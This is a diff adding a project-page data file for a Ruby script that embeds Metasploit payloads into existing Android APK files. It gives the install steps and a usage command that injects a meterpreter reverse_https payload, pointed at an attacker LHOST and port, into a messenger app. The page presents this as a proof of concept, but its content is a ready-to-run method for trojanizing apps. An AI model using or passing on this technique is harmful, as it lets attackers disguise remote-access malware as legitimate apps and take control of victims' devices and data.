@@ -1,0 +1,6 @@
+{
+  "name": "Metasploit-apk-embed-payload",
+  "tagline": "Embed a Metasploit Payload in an Original .Apk File",
+  "body": "<br />\r\n> I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it.\r\n \r\n  — [Bill Gates](http://www.goodreads.com/quotes/568877-i-choose-a-lazy-person-to-do-a-hard-job)\r\n \r\n**This script is a POC for injecting metasploit payloads on arbitrary APKs and Result of [How to Embed a Metasploit Payload in an Original .Apk File](http://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-0166901/) Lesson**\r\n**Authored by timwr, Jack64 , Updated by [xC0d3rZ](https://xc0d3rz.github.io/whoaim)**\r\n###Installation\r\n```bash\r\n gem install colorize\r\n``` \r\n###Requirements \r\n \r\n 1. Ruby (**> 1.8.7**).\r\n \r\n###Warring \r\nDon't edit or remove **embed_tools** folder.\r\nDon't remove or edit **tmp/*** folder until script finish Embedding \r\n###Usage\r\n```bash\r\napk-embed-payload.rb [target.apk] [msfvenom options]\r\n```\r\n<br>\r\ne.g\r\n```bash\r\napk-embed-payload.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\r\n```\r\n",
+  "note": "Don't delete this file! It's used internally to help with page regeneration."
+}
